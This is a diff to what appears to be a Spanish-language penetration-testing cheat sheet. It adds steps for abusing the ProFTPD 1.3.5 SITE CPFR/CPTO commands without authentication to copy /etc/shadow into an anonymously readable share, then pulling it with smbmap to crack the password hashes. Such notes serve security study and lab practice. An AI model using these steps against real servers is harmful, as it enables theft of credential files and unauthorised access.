@@ -46,6 +46,27 @@ searchsploit vsFTPd 2.3.44 -> unix/remote/49757.py -> Backdoor Command Execution
           ftp <ip-address> -> test:) 
 	  		   -> pass
 ```
+<br>
+En la versión ftp 1.3.5 existe una vulnerabilidad que te permite copiar archivos del sistema (CPFR y CPTO) a una ruta que tenga capacidad de lectura (anonymous) haciendo uso del comando site sin que tengas que autenticarte.
+```
+ftp <ip-address>
+-<><>-OK
+Name: anonymous
+Password: 
+530 Login incorrect.
+Login failed.
+ftp> help	# Con el comando help podras ver los demas comandos que estan disponibles.
+ftp> site help
+214-The following SITE commands are recognized
+CPFR <sp> pathname 
+CPTO <sp> pathname
+```
+Para copiar el archivo /etc/shadow a la ruta /home/<username>/share que en este caso es donde se ha montado el recurso compartido el cual tiene capacidad de lectura anonymous. Para replicar esto en otra máquina tendrías que ver la ruta donde está montado el recurso compartido.
+```
+site cpfr /etc/shadow	# site cpfr <ruta/a/copiar>
+site cpto /home/JhonDoe/share	# site cpto <ruta/a/donde/se/copiará>
+```
+Ya solo quedaría listar los recursos compartidos con smbmap y descargar el /etc/shadow para crackear los hashes.
 <br><br>
 ## 22 SSH (Secure Shell)
 Protocolo usado para conectarse de forma remota a un servidor de forma segura.
@@ -233,6 +254,7 @@ Especificar el nombre del recurso del servidor al cual se desea conectar.
 ```
 smbmap -H <ip-address> -r <resourcename>
 # -r -> Especificar la ruta del recurso al que se quiere conectar.
+# El nombre del recurso podría ser anonymous en caso de que exista. 
 ```
 <br>
 Descargar un recurso compartido a la ruta actual.
